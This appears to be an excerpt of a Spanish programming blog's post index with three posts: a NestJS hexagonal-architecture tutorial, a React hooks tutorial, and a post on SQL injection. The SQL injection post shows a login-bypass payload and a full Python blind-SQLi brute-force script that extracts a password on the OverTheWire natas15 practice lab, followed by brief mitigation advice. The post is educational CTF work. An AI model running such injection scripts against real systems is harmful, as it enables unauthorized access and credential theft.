qué sucedió.Por último, no es solo aplicar patrones sofisticados de software ni la última moda de los libros de ingeniería, sino de que aplicaras los principios SOLID y podrás obtener una mejor forma de testear los casos de uso y reglas de negocio.Veamos el siguiente ejemplo de una típica arquitectura en capas la que aparece en tutoriales y en la mayoría de las aplicaciones simples funciona perfecto .├──  controllers│ └──  ProductController.ts├──  model│ └──  Product.ts├──  repositories│ └──  ProductRepository.ts└──  services └──  ProductService.tsEn esta estructura podemos a simple vista decir que es una API de productos, pero no sabemos de qué se trata esa API, ¿es RESTful? ¿Es SOAP? O es un MVC también de seguro, la lógica está en la clase service, pero esto tampoco se explica por si solo para aplicaciones pequeñas este enfoque es suficiente, solo vemos el código fuente y listo, ¿pero en aplicaciones grandes en donde puede que no solo uses una base de datos? Y te integres con servicios como cache u otra estrategia de microservicios, podemos ordenar las capas de la aplicación y definir bien los servicios y separar responsabilidades, pero aún tendremos un problema que es el alto acoplamiento entre la lógica del negocio con el framework o librería implementada en el proyecto. Esto nos obliga a seguir las definiciones del framework o librería para hacer funcionar la aplicación, pero en realidad debe ser al revés el framework debe acoplarse a nuestras necesidades y no nosotros, entonces acá entra en juego los principios SOLID y las buenas prácticas de ingeniería.Ahora veamos una estructura de una arquitectura hexagonal├──  core│ ├──  application│ │ ├──  ProductCreator.ts│ │ └──  ProductSearcher.ts│ └──  domain│ ├──  entities│ │ └──  Product.ts│ ├──  ports│ │ └──  repositories│ │ └──  ProductRepository.ts│ └──  services│ └──  ProductService.ts└──  infraestructure ├──  adapters │ └──  PostgresProductRepository.ts ├──  database │ └──  postgres │ └──  orm └──  http-server └──  api ├──  jwt ├──  model └──  restcontrollersA simple vista ya entendemos la aplicación y la mayoría de su implementación tecnológica.Partimos desde la capa core en esta encontramos el dominio con una entidad Producto y un ServiceProduct que sería un servicio de dominio y una carpeta llamada ports la cual expone la interfaz ProductRepository de como las capas superiores se comunicaran con el dominio y la implementación de esta es hecha por infrasestructure/adapters y como apreciamos existe un implementación PostgresProductRepository.El dominio está definido ahora la capa superior de esta es llamada application la cual contiene los casos de uso, en esta ocasión vemos 2 casos de uso bastante descriptivos puede darse el caso que en vez de funciones creemos una clase ServiceApplication que contenga los casos de usos definidos como métodos.la siguiente capa es infraestructure la cual se comunica con la cap core mediante los adaptadores dependiendo del framework la forma de instanciar los componentes de la capa core cambiaran, pero generalmente debemos crear componentes con el principio de inyección de dependencias.En nuestra capa infraestructure podemos ver el módulo database donde se encuentra toda la lógica de conexión a postgres y finalmente vemos la capa http-server la cual contiene una api rest encapsulando toda la lógica http.Ejemplo con northwind database: Caso de uso crear productosComo vimos, la arquitectura hexagonal se centra en el dominio del negocio como núcleo y todo lo relacionado con aspectos tecnológicos, librerías, frameworks o estrategias está separado pero comunicados con el concepto de puertos y adapters. Muy bien, ahora crearemos un ejemplo muy parecido a la estructura anterior basada en un proyecto con NestjsNos transformamos en product owner y describimos nuestro problema de negocioCrearemos un servicio encargado de crear productos en la base de datos Northwind. Northwind es muy utilizada por Microsoft en ejemplos,Hablando brevemente sobre Northwind es un modelo de productos, órdenes de compras y empleados de una compañía que realizan las órdenes en esta primera iteración de nuestra implementación nos enfocaremos en los siguientes casos de usos. Creación de productos mediante un endpoint REST Validación de producto con categoría y proveedor válidosEsta aplicación será una API Rest encargada de mantener los productos de la base de datos Northwind con el tiempo ira iterando con nuevas enseñanzas sobre arquitectura hexagonal.Iniciando el projecto Nestjsnvm use 14npm i -g @nestjs/clinest new nestjs-northwind-hexagonalcd nestjs-northwind-hexagonalAhora generaremos los siguientes módulos: core: Contendrá los submódulos domain: Entidades, Servicios y Puertos de dominio application: Casos de uso que se comunicaran con la capa inferior, es decir, la de dominio infraestructure: Implementará lógicas de los adaptadores encargados de comunicarse con la capa de dominio y application (core module)nest g module corenest g module infraestructureCreando la capa de dominioGeneraremos la siguiente estructura en la capa de dominio: entities: entidades relacionadas para la creación de un producto ports/inbound: acá se encuentran los puertos de entrada representan piezas de software que interactúan con el dominio y pueden cambiar el estado del dominio ports/outbound: representan los puertos de salida que interactúan con el mundo exterior es decir fuera de la capa de dominio y se relacionan con tecnologías o sistemas en este ejemplo son repositorios así que los adaptadores que implementen estas interfaces se comunicaran con alguna base de datos o método de persistencia cosa que el dominio no le interesa saber services: estos son los servicios de dominios serán las implementaciones de ports/inbound que son piezas de software que interactúan con las entidades y definen reglas de negocio también definiremos los tests unitarios. domain├──  entities│ ├──  Category.ts│ ├──  Product.ts│ └──  Supplier.ts├──  ports│ ├──  inbound│ │ ├──  CategoryService.ts│ │ ├──  ProductService.ts│ │ └──  SupplierService.ts│ └──  outbound│ ├──  CategoryRepository.ts│ ├──  ProductRepository.ts│ └──  SupplierRepository.ts└──  services ├──  CategoryDomainService.spec.ts ├──  CategoryDomainService.ts ├──  ProductDomainService.spec.ts ├──  ProductDomainService.ts ├──  SupplierDomainService.spec.ts └──  SupplierDomainService.tsGeneraremos la siguiente estructura en la capa de application: ProductApplication.ts: este componente será el contrato de como la capa de infraestructura se comunica con los casos de uso en esta ocasión esta clase contienen el método createProduct() services: contendrá la implementación de los servicios de aplicación y sus correspondientes test unitarios application├──  ProductApplication.ts└──  services ├──  ProductApplicationService.spec.ts └──  ProductApplicationService.tsDefinición de entidadesexport class Category { categoryId: number; categoryName: string; description: string; picture: string;}export class Supplier { supplierId: number; companyName: string; contactName: string; contactTitle: string; address: string; city: string; postalCode: string; country: string; phone: string; homepage: string; }export class Product { productId: number; productName: string; category: Category; supplier: Supplier; quantityPerUnit: number; unitPrice: number; unitsInStock: number; unitsOnOrder: number; discontinued: boolean; static create(name: string, category: Category, supplier: Supplier) { const product = new Product() product.productName = name product.category = category product.supplier = supplier product.discontinued = false product.quantityPerUnit = 0 product.unitPrice = 0 product.unitsInStock = 0 product.unitsOnOrder = 0 return product }}Definición de Puertos// inbound portsexport interface CategoryService { findById(id: number): Promise&lt;Category&gt;; findAll(): Promise&lt;Category[]&gt;;}export interface SupplierRepository { findById(id: number): Promise&lt;Supplier&gt;;}export interface ProductService { save(product: Product): Promise&lt;Product&gt;; validateProductPrice(product: Product): boolean;}// outbound portsexport interface CategoryRepository { findById(id: number): Promise&lt;Category&gt;; findAll(): Promise&lt;Category[]&gt;}export interface SupplierRepository { findById(id: number): Promise&lt;Supplier&gt;;}export interface ProductRepository { save(product: Product): Promise&lt;Product&gt;;}Definción de ServiciosAcá implementamos los contratos definidos en ports/inbound e inyectamos mediante su constructor los repositorios, entonces encapsulamos la lógica de negocio en la capa de dominio y no lo relacionamos con ningún ente externo como podrían ser anotaciones de Frameworks o librerías si necesitamos utilizar algo así solo debemos definir la funcionalidad como puertosexport class ProductDomainService implements ProductService { constructor(private repository: ProductRepository) {} async save(product: Product): Promise&lt;Product&gt; { if (this.validateProductPrice(product)) { return this.repository.save(product) } throw new ProductServiceError('Product price cannot be negative or equal to zero') } validateProductPrice(product: Product): boolean { return product.unitPrice &gt; 0 }}export class CategoryDomainService implements CategoryService { constructor(private repository: CategoryRepository) {} findById(id: number): Promise&lt;Category&gt; { return this.repository.findById(id) } findAll(): Promise&lt;Category[]&gt; { return this.repository.findAll() }}export class SupplierDomainService implements SupplierService { constructor(private repository: SupplierRepository) {} findById(id: number): Promise&lt;Supplier&gt; { return this.repository.findById(id) }}Definición de la capa applicationAcá definimos el caso de uso, una opción también válida es reemplazar el nombre ProductApplication por algo más descriptivo como ProductCreator o algo de este estilo, pero lo importante acá es definir esta interfaz como punto de entrada para poder usar el caso de uso es importante que sea una interfaz también ya que facilita el reemplazo en las pruebas unitarias.export interface ProductApplication { createProduct(newProduct: NewProductDTO): Promise&lt;number&gt;}Implementación del caso de usoComo podemos ver nuestro caso de uso tienen una lógica de validación algo más compleja que el servicio de dominio mientras un servicio de dominio se encarga de validaciones de negocio de su entidad relacionada, un servicio de aplicación o caso de uso puede hacer invocaciones a distintos servicios fuera del scope de la entidad en este caso estas validaciones con servicios de dominio de otras entidades es a modo de ejemplo, pero describe perfectamente la idea.export class ProductApplicationService implements ProductApplication { constructor( private product: ProductService, private category: CategoryService, private supplier: SupplierService, ) { } async createProduct(newProduct: NewProductDTO) { const category = await this.category.findById(newProduct.categoryId) if (!category) { throw new ProductApplicationError(`Categoría no encontrada id=${newProduct.categoryId}`) } const supplier = await this.supplier.findById(newProduct.supplierId) if (!supplier) { throw new ProductApplicationError(`Proveedor no encontrado id=${newProduct.supplierId}`) } const entity = Product.create(newProduct.name, category, supplier) const saved = await this.product.save(entity) return saved.productId }}Arquitectura hexagonal y la facilidad de los test unitariosAl aplicar arquitectura hexagonal en nuestro proyecto los test unitarios suelen ser más simples de implementar, si se te da el caso en que aún te cuesta realizar un test unitario por dependencias o problemas de falseado de componentes puede que necesites refactorizar tus piezas de software y ver si se cumple el principio de responsabilidad única.test unitarios sobre ProductServiceA continuación preparamos unos test unitarios sobre nuestro componente ProductDomainService los test son sencillos, pero validan el comportamiento deseado por las reglas de negocio.function ProductrepositoryMock(product: Product): ProductRepository { return { save: jest.fn().mockReturnValue(Promise.resolve(product)) }}describe('ProductDomainService', () =&gt; { let service: ProductService = null it('should call ProductRepository.save()\"', async () =&gt; { const repositoryMock = ProductrepositoryMock(({ productId: 1} as Product)) service = new ProductDomainService(repositoryMock) await service.save({ productId: 1, unitPrice: 100} as Product) expect(repositoryMock.save).toBeCalled() }); it('should return true productService.validateProductPrice() when unitPrice is greater than 0 \"', async () =&gt; { const repositoryMock = ProductrepositoryMock(({ productId: 1} as Product)) service = new ProductDomainService(repositoryMock) const result = service.validateProductPrice({ productId: 1, unitPrice: 100} as Product) expect(result).toBe(true) }); it('should throw ProductServiceError when unitPrice is negative or zero\"', async () =&gt; { const repositoryMock = ProductrepositoryMock(({ productId: 1} as Product)) service = new ProductDomainService(repositoryMock) await expect(service.save({ productId: 1, unitPrice: 0 } as Product)).rejects.toThrow(ProductServiceError) await expect(service.save({ productId: 1, unitPrice: -10 } as Product)).rejects.toThrow(ProductServiceError) });})Capa de infraestructucturaGeneramos la siguiente estructura: adapters: serán las implementaciones de los puertos definidos en nuestra capa de dominio http-server: definiremos toda la lógica de nuestro servidor http en este caso solo tendremos un endpoint y un filtro http para controlar los errores en este módulo emplearemos Nestjs northwind-database: en este módulo tendremos la conexión a la base de datos Northwind y en esta parte estarán las entidades de base de datos no confundir con entidades de dominio son cosas distintas a pesar de que el modelo de la base de datos representa el negocio estas entidades están más relacionadas con TypeOrm que nada. infraestructure├──  adapters│ ├──  category.repository.adapter.ts│ ├──  product.repository.adapter.ts│ └──  supplier.repository.adapter.ts├──  http-server│ ├──  controllers│ │ └──  product.controller.ts│ ├──  exception-filters│ │ └──  product-exception.filter.ts│ └──  model│ ├──  app.response.ts│ └──  create-product.request.ts├──  infraestructure.module.ts├──  northwind-database│ ├──  entities│ │ ├──  category.entity.ts│ │ ├──  product.entity.ts│ │ └──  supplier.entity.ts│ └──  northwind-database.module.ts└──  shared └──  AppLogger.tsIniciando la integración con NorthwindPara levantar la base de datos necesitar tener instalado docker y docker-compose ahora iniciamos nuestra base de datos de Northwind con docker-compose y un script del esquema de Northwind encontrados en el siguiente repositorio Github repository nos dirigimos al directorio northwind-db/ y encontraremos un archivo docker-compose.yml con el siguiente contenido:version: '3'services: db: container_name: northwind-db image: postgres:13 environment: POSTGRES_DB: northwind POSTGRES_USER: northwind POSTGRES_PASSWORD: northwind volumes: - postgresql_bin:/usr/lib/postgresql - postgresql_data:/var/lib/postgresql/data - ./northwind.sql:/docker-entrypoint-initdb.d/northwind.sql - ./files:/files ports: - 5432:5432 networks: - dbnetworks: db: driver: bridgevolumes: pgadmin_root_prefs: driver: local postgresql_data: driver: local postgresql_bin: driver: localentonces ejecutamos lo siguiente# up databasedocker-compose up -d # show running containersdocker ps Si todo salió bien tendremos la base de datos northwind con postgres como motor, ahora instalamos las librerías necesarias para conectarnos a la base de datos.npm install --save @nestjs/typeorm typeorm pgComo habíamos señalado en una arquitectura hexagonal, todas las interacciones fuera de nuestra lógica core deben hacerse en la capa infraestructure la cual es la que interactúa con el mundo exterior, entonces generaremos el siguiente submódulo de infraestructure.nest g module infraestructure/northwind-databaseDentro de este módulo crearemos las entidades de base de datos que mapean las estructura de tablas del modelo, estas entidades no son los mismos que las entidades de capa de dominio son conceptos distintos en hexagonal, ya que Las entidades de dominio reflejan el modelo de negocio mientras que las entidades de base de datos reflejan las tablas y relaciones y algunos casos estos modelos no son iguales.Entidades de base de datosA continuación definiremos las entidades de base de datos con sus correspondientes decoradores.@Entity({ name: 'products'})export class ProductEntity { @PrimaryGeneratedColumn({name: 'product_id'}) productId: number; @Column({ name: 'product_name'}) productName: string; @Column({ name: 'quantity_per_unit'}) quantityPerUnit: number; @Column({ name: 'unit_price'}) unitPrice: number; @Column({ name: 'units_in_stock'}) unitsInStock: number; @Column({ name: 'units_on_order'}) unitsOnOrder: number; @Column({ default: false }) discontinued: boolean; @ManyToOne(() =&gt; CategoryEntity) @JoinColumn({ name: \"category_id\" }) category: CategoryEntity; @ManyToOne(() =&gt; SupplierEntity) @JoinColumn({ name: \"supplier_id\" }) supplier: SupplierEntity; }@Entity({ name: 'categories' })export class CategoryEntity { @PrimaryGeneratedColumn({ name: 'category_id' }) categoryId: number; @Column({ name: 'category_name' }) categoryName: string; @Column() description: string; @Column() picture: string; @OneToMany(() =&gt; ProductEntity, (product) =&gt; product.category) products: ProductEntity[]}@Entity({ name: 'suppliers' })export class SupplierEntity { @PrimaryGeneratedColumn({ name: 'supplier_id' }) supplierId: number; @Column({ name: 'company_name' }) companyName: string; @Column({ name: 'contact_name' }) contactName: string; @Column({ name: 'contact_title' }) contactTitle: string; @Column({ name: 'address' }) address: string; @Column({ name: 'city' }) city: string; @Column({ name: 'postal_code' }) postalCode: string; @Column({ name: 'country' }) country: string; @Column({ name: 'phone' }) phone: string; @Column({ name: 'homepage' }) homepage: string; @OneToMany(() =&gt; ProductEntity, (product) =&gt; product.category) products: ProductEntity[]}El siguiente paso es inyectar el módulo de TypeOrm a NorthwindDatabaseModule. Agregamos las credenciales y definimos las entidades a utilizar con esto nuestro módulo está terminado.import { Module } from '@nestjs/common';import { TypeOrmModule } from '@nestjs/typeorm';import { CategoryEntity } from './entities/category.entity';import { ProductEntity } from './entities/product.entity';import { SupplierEntity } from './entities/supplier.entity';@Module({ imports: [ TypeOrmModule.forRoot({ type: 'postgres', host: 'localhost', port: 5432, username: 'northwind', password: 'northwind', database: 'northwind', entities: [ ProductEntity, CategoryEntity, SupplierEntity ], synchronize: false, logging:['query'] }), ]})export class NorthwindDatabaseModule { }Definiendo los Adapters para los puertos de nuestra capa de dominioAhora como ya tenemos la persistencia lista, implementaremos los puertos de nuestra capa de dominio:@Injectable()export class CategoryRepositoryAdapter implements CategoryRepository { constructor(@InjectRepository(CategoryEntity) private repository: Repository&lt;CategoryEntity&gt;) { } async findById(id: number): Promise&lt;Category&gt; { return this.repository.findOneBy({ categoryId: id }) } async findAll(): Promise&lt;Category[]&gt; { return this.repository.find() }}@Injectable()export class SupplierRepositoryAdapter implements SupplierRepository { constructor(@InjectRepository(SupplierEntity) private repository: Repository&lt;SupplierEntity&gt;) { } async findById(id: number): Promise&lt;Supplier&gt; { return this.repository.findOneBy({ supplierId: id }) }}@Injectable()export class ProductRepositoryAdapter implements ProductRepository { constructor(@InjectRepository(ProductEntity) private repository: Repository&lt;ProductEntity&gt;) { } async save(p: Product) { return this.repository.save(p) }}Definiendo el módulo http-serverAhora definiremos el módulo dehttp-server haciendo uso de NestjsModeloexport interface AppResponse { status: number; message: string; data?: any}export interface CreateProductRequest { name: string; categoryId: number; supplierId: number;}Exception FilterDefiniremos un exception filter para poder controlar las excepciones de una forma centralizada y sin tener que delegar esta responsabilidad de definir una respuesta a nuestros servicio de dominio o de aplicación, que lo haga el framework nos ahorraremos trycatch innecesarios.@Catch(ProductApplicationError)export class ProductCreatorFilter implements ExceptionFilter { catch(exception: ProductApplicationError, host: ArgumentsHost) { const ctx = host.switchToHttp(); const response = ctx.getResponse&lt;Response&gt;(); const request = ctx.getRequest&lt;Request&gt;() Logger.error(`ProductController (${request.method}) at {${request.path}} error: ${exception.message}`) response .status(HttpStatus.BAD_REQUEST) .json({ status: HttpStatus.BAD_REQUEST, message: exception.message }); }}Controlador punto de entrada que invocara a ProductApplicationServiceAhora definimos en controlador que será el punto de entrada para poder crear el producto, este endpoint recibe un nombre de producto, una, id de categoría y un, id de proveedor. Esta clase hace uso de la anotación @UseFilter() Para poder emplear el filtro de excepciones que habíamos definido ahora la inyección de nuestro servicio lo hacemos mediante el constructor y la anotación @Inject(PRODUCT_APPLICATION) Necesitamos inyectar nuestro servicio de esta manera, ya que los servicio de dominio y de aplicación que definimos debemos crearlos mediante custom provider una opción que nos da Nestjs en escenario más complejos para la inyección de dependencias.@Controller('/product')@UseFilters(ProductCreatorFilter)export class ProductController { constructor(@Inject(PRODUCT_APPLICATION) private application: ProductApplication) {} @Post() async createProduct(@Body() request: CreateProductRequest): Promise&lt;AppResponse&gt; { AppLogger.log(`(POST) Create product`, request) const productId = await this.application.createProduct(request) return { status: 201, message: `Product(id=${productId}) created OK` } }}El core de nuestra arquitectura hexagonal esta completo, definimos pruebas unitarias que validan las lógicas de negocio propuestas, y pudimos implementar un enfoque mas descriptivo de nuestra aplicación.¿Que se viene despúes de tener nuestras capas domain, application e infraestructure?Ahora nos queda configurar los módulos core, infraestructure y northwind-database, para ello necesitamos definir CustomProviders y Módulos dinámicos de Nestjs, estos son temas avanzados dentro el framework que los abordaré en otro post con mayor detalle les dejaré el repositorio con el código donde podrán revisar la configuración, pero se vienen cosas más avanzadas donde explicaremos a fondo estas funcionalidades y que podemos hacer.Puedes ver los demás artículos de arquitectura hexagonal acá 😉 Arquitectura hexagonal Parte II Arquitectura hexagonal Parte III Arquitectura hexagonal Parte IV Github repositoryFinalizando con meme de despedida aca las conclusiones son del lector." }, { "title": "Cuando un SQL Injection deja a tu aplicación como un chiste", "url": "/posts/sqli/", "categories": "Programacion, Python, Cyberseguridad, CTF", "tags": "overthewire, python, ctf, cyberseguridad", "date": "2022-10-04 20:32:00 -0300", "snippet": "El título suena rudo, pero a decir verdad en muchas empresas y desarrolladores la seguridad la dejan a la ligera. A sí que veamos que podemos hacer con sqlijection. Increiblemente aún son reportadas vulnerabilidades con esta técnica de intrusión, los factores pueden ser diversos pero no estamos acá para buscar culpables acá se enseña y se aprende.¿Qué diablos es sqlinjection?Es una forma de inyectar sentencias SQL adicionales a una query ya definida en donde necesita como parámetro la entrada del usuario y si la entrada del usuario no es sanitizada o se confía plenamente en lo que ingresara un sqlinjection podrá ser ejecutadoEjemplo mas básico los comienzos de las webSupongamos un login básico donde el usuario ingresa su nombre y clave entonces por abajo el sistema consulta no importando el lenguajeString query = \"SELECT * FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"';\";Esta concatenación nos permite ingresar lo que queramos, por ejemplo imaginemos ingresar lo siguiente:String username = \"admin' AND 1 = 1 --\";Entonces cuando se ejecuta la query termina siendo lo siguiente:SELECT * FROM users WHERE username = 'admin' AND 1 = 1 -- AND password = 'some junk';\";Estamos diciendo que la query devolverá a nuestro usuario admin sin verificar la contraseña, ya que esa condición fue comentada y la sentencia 1=1 siempre será true. Esta es la Sqlinjection más básica y existen un montón dependiendo del motor de base de datos e incluso con las NoSql también tendremos opciones de ataque.SQLInjection sobre un entorno controlado Over The WireYa sabiendo como funciona esto te enseñaré un ataque de Sqlinjection con fines educativos y su mitigación. Para practicar sobre entornos controlados existen un montón de páginas en internet y te ofrecen una manera guiada para meterse en el mundo de la ciberseguridad de una forma divertida y competitiva sin que te hablen de la aburrida ISO27000 Vamos por más que eso y metámonos en los CTF.¿Qué son los CTF?Básicamente significa Capture the flag Es decir, captura la maldita bandera y muestra que eres el maldito amo, una alusión a que has encontrado o resuelto el objetivo planteado. Existen montón de CTF como desafíos de intrusión web, intrusión sobre active directory, escalada de privilegios, acertijos de código, criptografía, etc. En esta ocasión les presentaré Over the Wire. donde podremos adentrarnos en este mundillo, esta página es ideal para el que quiere empezar, ya que los ejercicios son una forma guiada de resolverlos y te aseguro que aumentaras tus habilidades en bash, Linux, conceptos básicos de ciberseguridadResolviendo un ejercicio de SqlInjection en los juegos natasEn los juegos de los servidores natas nos centraremos en el número 15, ya que este es vulnerable a Sqlinjection, para acceder al server 15 ya debes previamente haber comprometido el servidor anterior en donde la flag o “bandera” capturada sería la clave del servidor siguiente.Ahora nos dirigimos a la página natas15 Ingresamos contraseñas y vemos un pequeño input que consulta por un nombre de usuario.Si analizamos la página observaremos que en el input tendremos 2 respuestasAhora enviando la siguiente información vemos un error en query con la siguiente sentencia \" and 1 = 1Ya tenemos un indicio que es vulnerable nuestro input a SqlInjection. El ataque que realizaremos es llamado Blind Sqlinjection ya que no tienes ninguna salida de error referente a la base de datos (logs, trazas, queries, etc) solo una salida definida por la aplicación, pero si podemos realizar peticiones en base a condiciones de verdadero o falso y obtener la información que queramos. En este caso queremos la contraseña del usuario natas16, entonces definimos el siguiente input: natas16\" and password like \"A%\" #Ya que sabemos que el user natas16 existe entonces solo necesitamos agregar una sentencia más para encontrar su password y la mejor manera es usando el operador LIKE sobre el campo password asumiendo que exista, entonces con la magia de like podremos encontrar la password del user mediante un ataque de fuerza bruta probando con cada carácter, digito y símbolo desde el primer carácter de la columna password hasta el último que posea la columna password.OverThe wire te da pistasComo ven en la página tenemos un link con el código fuente del lado del servidor con la lógica con esto puedes deducir la forma de realizar el ataque por ejemplo el código nos indica que la base de datos es MySQL y la estructura del esquema sin embargo con sqlinjection puedes lograr mapear las bases de datos, los esquemas, las tablas y columnas con un poco mas de esfuerzo y tiempo.Python for CTF playersLo primero será instalar las librerías que necesitemos, en nuestro caso solo será requests y pwntools que sería la navaja suiza para scripting en pentesting en este caso solo usaremos las barras de progreso, pero esta librería contiene muchas utilidades interesantes.# http requestpip3 install requests# for pwn toolsapt-get updateapt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essentialpython3 -m pip install --upgrade pippython3 -m pip install --upgrade pwntoolsGeneramos el siguiente script baseImportamos las librerías que usaremos, definimos las credenciales para conectarnos a la página víctima y generamos la función make_request() la que nos devolverá el contenido de la página además hacemos uso de la librería signal para capturar el evento de teclado Control+C para que se vea más limpia la salida sin tantos errores de KeyBoardInterruptimport requests, os, sysfrom pwn import *from requests.auth import HTTPBasicAuthimport urllib.parseimport string, signaluser = 'natas15'password = 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB' url = f\"http://{user}.natas.labs.overthewire.org\"def make_request(username): auth = HTTPBasicAuth(user, password) res = requests.get(url, auth=auth, params={ 'debug': 'true', 'username': username }) return res.textdef def_handler(sig, frame): print('\\n\\n[*] Exit...\\n') sys.exit(1)signal.signal(signal.SIGINT, def_handler)Ahora definiremos la función force_brute_attack()con la comprometeremos la página víctimaLos pasos del script son los siguientes Obtenemos los caracteres y dígitos ascii del módulo string de python. Creamos barras de progreso. Iteramos sobre los caracteres de la columna password. Definimos una la variable para detener el script cuando ya obtengamos la password. Hacemos la petición al servidor Si la respuesta en texto contiene la frase “this user exits” entonces agregamos el caracter a la variable password y continuamos con el próximo carácter a encontrar de la columna password finalmente devolvemos la password encontradadef force_brute_attack(): # 1 get characters characters = f'{string.ascii_letters}{string.digits}' natas16_pass = '' # 2 progress bar attackProgress = log.progress('Brute force attack') attackProgress.status('Starting attack') passwordHackedProgress = log.progress('Password for natas16') # 3 itering on password column while True: found = False # 4 iteraing over characters for c in characters: attackProgress.status(f'trying with {c} character') injection = f'natas16\" AND password LIKE BINARY \"{natas16_pass}{c}%\" #' # making http request res = make_request(injection) # 5 true when character is valid if 'This user exists' in res: natas16_pass += c passwordHackedProgress.status(natas16_pass) found = True break # break the cicle when password were found if found == False: break attackProgress.success(f'Password found {natas16_pass}') return natas16_passFinalmente el script queda de la siguiente manera:import requests, os, sysfrom pwn import *from requests.auth import HTTPBasicAuthimport urllib.parseimport string, signaluser = 'natas15'password = '' url = f\"http://{user}.natas.labs.overthewire.org\"def make_request(username): auth = HTTPBasicAuth(user, password) res = requests.get(url, auth=auth, params={ 'debug': 'true', 'username': username }) return res.textdef def_handler(sig, frame): print('\\n\\n[*] Exit...\\n') sys.exit(1)signal.signal(signal.SIGINT, def_handler)def force_brute_attack(): # 1 get characters characters = f'{string.ascii_letters}{string.digits}' natas16_pass = 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB' # 2 progress bar attackProgress = log.progress('Brute force attack') attackProgress.status('Starting attack') passwordHackedProgress = log.progress('Password for natas16') # 3 itering on password column while True: found = False # 4 iteraing over characters for c in characters: attackProgress.status(f'trying with {c} character') injection = f'natas16\" AND password LIKE BINARY \"{natas16_pass}{c}%\" #' # making http request res = make_request(injection) # 5 true when character is valid if 'This user exists' in res: natas16_pass += c passwordHackedProgress.status(natas16_pass) found = True break # break the cicle when password were found if found == False: break attackProgress.success(f'Password found {natas16_pass}') return natas16_passif __name__ == \"__main__\": pass_found = force_brute_attack() os.system(f'echo \"{pass_found}\" &gt; credentials/natas16') log.info('Password saved!')Ejecutando el ataqueAhora si ejecutamos el script tendremos la siguiente salidaY al pasar el tiempo empezará a completar la contraseña del próximo servidor y mostrándose de una forma bastante coolProbando la contraseña encontradaHemos encontrado una password que tiene pinta de ser solo texto claro y probándola sobre el siguiente server podemos ver que es válida ya hemos capturado la bandera. El ataque efectuado es llamado Blind SqlInjection, ya que la inyección no nos devuelve una salida de error del motor de base de datos solo estados y debemos evaluarlos para poder encontrar lo que necesitemos, esta vez este ataque fue aplicado al campo password, pero con este mismo sqlinjection podemos enumerar la base de datos entera si deseamos dependiendo del motor de base de datos las queries cambiarán, pero podemos enumerar bases de datos tablas y campos, existen herramientas como sqlmap que hacen todo este trabajo de forma automatizada, pero nunca viene mal saber qué pasa por debajo de esas herramientas.Al loguernos encontramos el próximo desafío, donde podemos intentar resolverlo sin ver el código fuente de primeras pero no hay nada de malo en observarlo, te sorprenderas que muchas veces no existe una única solución en los CTFs aunque hallan sido creados para ser solucionados de una única manera.Mitigando los sqliijectionLo primero que debes hacer es siempre sanitizar las entradas del usuario y generalmente la mayoría de librerías de SQL ya vienen con métodos para sanitizar queries y ejecutarlas de forma más segura y controlada.Un segundo punto es siempre guardar contraseñas de forma cifrada, existen muchas formas de cifrado y técnicas para guardar las contraseñas, pero en algunos casos algunos algoritmos de cifrado pueden ser rotos de forma offline mediante un ataque de fuerza bruta si la password es débil es por eso que como usuarios debemos usar contraseñas robustas.Conclusiones?Nada de conclusiones eso es para ti yo te regalaré un meme" }, { "title": "Usando los Hooks de React más allá del useState", "url": "/posts/Usando-los-Hooks-de-React-m%C3%A1s-all%C3%A1-del-useState/", "categories": "Programacion, React, Javascript", "tags": "typescript, javascript, frontend, hooks", "date": "2022-09-21 20:32:00 -0300", "snippet": "Usando los Hooks de React más allá del useStateHack 1 - Petición asíncrona con useState() y useEffect() juntosEl siguiente componente muestra los datos obtenidos mediante una operación asíncrona como lo puede ser una petición hacia alguna API.Se define el Hook useState() para almacenar el estado del componente y se define el Hook useEffect() para poder implementar la lógica de actualización del estado. useEffect() recibe una función la cual será la operación deseada a realizar y recibe un array de dependencias el cual si cualquier valor del array cambia el Hook se gatilla y ejecuta la función definida. Como no existe aún alguna dependencia debemos agregar un array vacio, ya que de lo contrario el Hook no funcionara correctamente.import React, { useEffect, useState } from 'react';import getPieChartData from '../../../core/application/getPieChartData';import { PieChartData } from '../../../core/domain/model/PieChartData';import PieChart from '../../components/PieChart';export default function PieChartFromAPI() { const [data, setData] = useState&lt;PieChartData | null&gt;(null) useEffect(() =&gt; { getPieChartData() .then(pieChart =&gt; setData(pieChart)) }, []) return &lt;PieChart data={data} /&gt;}Falsearemos la petición asíncrona con un retraso de 1 segundo con la siguiente función.const awaitTimeout = (delay: number) =&gt; new Promise(resolve =&gt; setTimeout(resolve, delay));Crearemos nuestra función que simula una API.import { PieChartData } from \"../domain/model/PieChartData\";import { awaitTimeout } from \"../libs/awaitTimeout\";const PIE_DATA: PieChartData = { labels: ['Red', 'Blue', 'Yellow', 'Green', 'Purple', 'Orange'], datasets: [ { label: '# of Votes', data: [12, 19, 3, 5, 2, 3], backgroundColor: [ 'rgba(255, 99, 132, 0.2)', 'rgba(54, 162, 235, 0.2)', 'rgba(255, 206, 86, 0.2)', 'rgba(75, 192, 192, 0.2)', 'rgba(153, 102, 255, 0.2)', 'rgba(255, 159, 64, 0.2)', ], borderColor: [ 'rgba(255, 99, 132, 1)', 'rgba(54, 162, 235, 1)', 'rgba(255, 206, 86, 1)', 'rgba(75, 192, 192, 1)', 'rgba(153, 102, 255, 1)', 'rgba(255, 159, 64, 1)', ], borderWidth: 1, }, ],};export default function getPieChartData(): Promise&lt;PieChartData&gt; { return awaitTimeout(1200) .then(() =&gt; PIE_DATA)}Nuestra aplicación funciona perfecto, pero esa demora implementada debemos hacerla notar mediante un aviso para nuestros usuarios agregaremos un nuevo estado de la siguiente manera. const [loading, setLoading] = useState(false) useEffect(() =&gt; { setLoading(true) getPieChartData() .then(pieChart =&gt; setData(pieChart)) .finally(() =&gt; setLoading(false)) }, []) if (loading) { return &lt;div&gt;Loading motherfucking data...&lt;/div&gt; }Perfecto muchachos hemos usado esta pareja explosiva con un ejemplo práctico que de seguro los verás muy a menudo, ahora te haré la siguiente pregunta ¿qué pasaría si necesitamos manejar estados más complejos? ¿Qué pasaría si nuestro componente tiene una gran cantidad de valores, objetos primitivos o arreglos, y por último ¿y si un valor dependiera de otro? La solución simple es usar un objeto con useState() pero no siempre será la mejor solución especialmente cuando React usa el concepto de inmutabilidad para realizar los renderizados de componentes un objeto o un arreglo en Javascript no es un objeto completamente inmutable y debes tener ciertas precauciones cuando actualizas un 